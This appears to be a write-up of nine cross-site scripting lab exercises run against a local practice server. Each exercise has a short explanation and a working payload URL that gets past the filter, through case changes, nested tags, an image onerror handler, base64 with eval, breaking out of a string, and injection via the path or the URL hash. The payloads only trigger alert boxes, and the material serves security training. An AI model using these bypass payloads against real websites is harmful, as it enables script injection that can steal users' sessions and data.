# XSS (Cross Site Scripting)

There are nine XSS examples.

## 1

This example just takes the input directly from the URL and inserts it into the page.

`http://localhost:31337/xss/example1.php?name=<script>alert(1);</script>`

## 2

This article attempts filtering by removing every instance of `<script>` and `</script>` from the input.

`http://localhost:31337/xss/example2.php?name=<SCRIPT>alert(1);</SCRIPT>`

## 3

Now it's case insensitive. However, it only does one pass, leading to the following bypass:

`http://localhost:31337/xss/example3.php?name=<scr<script>ipt>alert(1);</scr</script>ipt>`

## 4

They're catching on now, and blocking all script tags. However, there are other ways to execute scripts on the page.

`http://localhost:31337/xss/example4.php?name=<img src="slothlife" onerror="alert(1);">`

## 5

In this example they've simply blocked the "alert" keyword. Nothing a little base64 + eval can't get around.

`http://localhost:31337/xss/example5.php?name=<script>eval(atob('YWxlcnQoMSk7'));</script>`

## 6

This spits your input out in the middle of a javascript string declaration. To execute some of our own javascript, we just have to end the string declaration and insert our code. The comment on the end is to avoid any syntax errors.

`http://localhost:31337/xss/example6.php?name=hello%22;%20alert%281%29;//`

## 7

This is the same as 6, but with ' instead of ", and you have to deal with `htmlentities()`.

`http://localhost:31337/xss/example7.php?name=hello%27;%20alert%281%29;//`

## 8

This example presents a form, which is actually a decoy. You may notice from the code that the form action is filled in from the `$_SERVER["PHP_SELF"]` variable, which is just a reflection of the path. We can insert our code using this as our vector.

`http://localhost:31337/xss/example8.php/"><script>alert(1)</script>`

## 9

Similar to the last attack, just using the hash as the vector rather than a standard parameter.

`http://localhost:31337/xss/example9.php#%3Cscript%3Ealert%281%29%3C/script%3E`
